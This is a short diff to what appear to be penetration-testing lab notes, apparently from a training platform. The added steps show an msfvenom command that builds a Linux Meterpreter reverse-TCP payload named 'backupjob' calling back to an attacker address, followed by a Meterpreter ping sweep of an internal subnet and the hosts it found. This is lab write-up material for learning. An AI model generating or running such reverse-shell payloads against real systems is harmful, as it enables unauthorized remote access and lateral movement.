@@ -256,4 +256,23 @@ SSH
 ssh ubuntu@10.129.244.34
 ```
 
-Follow the steps to perform the ping sweep, like [[ping-f]]
+Follow the steps to perform the ping sweep, like [[#Ping Sweep via For Loop|Ping For Loop]]  
+
+Create the msfvenom payload:
+```go
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.252 -f elf -o backupjob LPORT=8080
+```
+
+I used the meterpreter module `ping_sweep`
+```go
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+
+The two IP addresses are:
+```go
+172.16.5.19
+```
+
+```go
+172.16.5.129
+```
